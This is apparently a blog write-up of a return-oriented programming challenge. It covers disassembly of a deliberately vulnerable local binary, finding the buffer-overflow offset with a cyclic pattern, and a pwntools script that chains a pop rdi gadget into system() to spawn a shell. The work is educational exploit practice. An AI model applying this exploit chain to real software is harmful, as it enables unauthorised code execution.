---
title: "Return Oriented Programming Series - 1"
date: 2019-07-19
description: "ROP"
tags: ["Binary Exploitation Series"]
type: post
weight: 20
showTableOfContents: true

---

# Return Oriented Programming

---

# ⚖️ Challenge Write-up

---

# General Analysis

![Untitled.png](https://hackmd.io/_uploads/r1tjd3LQT.png)

# Functions

```nasm
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010a0  setresuid@plt
0x00000000004010b0  setresgid@plt
0x00000000004010c0  system@plt
0x00000000004010d0  printf@plt
0x00000000004010e0  geteuid@plt
0x00000000004010f0  gets@plt
0x0000000000401100  getegid@plt
0x0000000000401110  _start
0x0000000000401140  _dl_relocate_static_pie
0x0000000000401150  deregister_tm_clones
0x0000000000401180  register_tm_clones
0x00000000004011c0  __do_global_dtors_aux
0x00000000004011f0  frame_dummy
0x00000000004011f6  callme
0x0000000000401222  init
0x000000000040126f  main
0x00000000004012b0  __libc_csu_init
0x0000000000401320  __libc_csu_fini
0x0000000000401328  _fini
pwndbg>

pwndbg> disass main
Dump of assembler code for function main:
   0x000000000040126f <+0>:     endbr64
   0x0000000000401273 <+4>:     push   rbp
   0x0000000000401274 <+5>:     mov    rbp,rsp
   0x0000000000401277 <+8>:     sub    rsp,0x20
   0x000000000040127b <+12>:    mov    eax,0x0
   0x0000000000401280 <+17>:    call   0x401222 <init>
   0x0000000000401285 <+22>:    lea    rdi,[rip+0xd78]        # 0x402004
   0x000000000040128c <+29>:    mov    eax,0x0
   0x0000000000401291 <+34>:    call   0x4010d0 <printf@plt>
   0x0000000000401296 <+39>:    lea    rax,[rbp-0x20]
   0x000000000040129a <+43>:    mov    rdi,rax
   0x000000000040129d <+46>:    mov    eax,0x0
   0x00000000004012a2 <+51>:    call   0x4010f0 <gets@plt>
   0x00000000004012a7 <+56>:    mov    eax,0x0
   0x00000000004012ac <+61>:    leave
   0x00000000004012ad <+62>:    ret
End of assembler dump.
pwndbg>

pwndbg> disass callme 
Dump of assembler code for function callme:
   0x00000000004011f6 <+0>:     endbr64
   0x00000000004011fa <+4>:     push   rbp
   0x00000000004011fb <+5>:     mov    rbp,rsp
   0x00000000004011fe <+8>:     sub    rsp,0x10
   0x0000000000401202 <+12>:    mov    DWORD PTR [rbp-0x7],0x2d20736c
   0x0000000000401209 <+19>:    mov    WORD PTR [rbp-0x3],0x616c
   0x000000000040120f <+25>:    mov    BYTE PTR [rbp-0x1],0x0
   0x0000000000401213 <+29>:    lea    rax,[rbp-0x7]
   0x0000000000401217 <+33>:    mov    rdi,rax
   0x000000000040121a <+36>:    call   0x4010c0 <system@plt>
   0x000000000040121f <+41>:    nop
   0x0000000000401220 <+42>:    leave
   0x0000000000401221 <+43>:    ret

0x40121a <callme+36>    call   system@plt                      <system@plt>
command: 0x7fffffffe221 ◂— 0x3000616c2d20736c /* 'ls -la' */

Thus it is not giving us shell access, need to use gadgets to do the same.
```

# Exploit to find at what offset we have buffer overflow

```nasm
pwndbg> cyclic 120
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaa
laaaaaaamaaaaaaanaaaaaaaoaaaaaaa
pwndbg> r
Starting program: /home/shinjitsu/Youtube/Binary Exploitation/6. ROP/rop 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Enter Data - aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaa
pwndbg> cyclic -l faaaaaaa
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```

- Thus anything more than 40 will get overflowed

# Writing out our exploit

```python
#!/usr/bin/python3

from pwn import *

elf = context.binary = ELF('./rop')

p = process('./rop')
pop_rdi = 0x0000000000401313
shell = 0x404060
ret = 0x000000000040101a
payload = cyclic(40) + pack(pop_rdi) + pack(shell) + pack(ret) + pack(elf.sym.system)
p.sendline(payload)
p.interactive()
```

# Output

```bash
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)

[+] Starting local process './rop': pid 3701
[*] Switching to interactive mode
$ ls
exploit.py  README.md  rop  rop.c

Thus we got the shell!!!!!!
```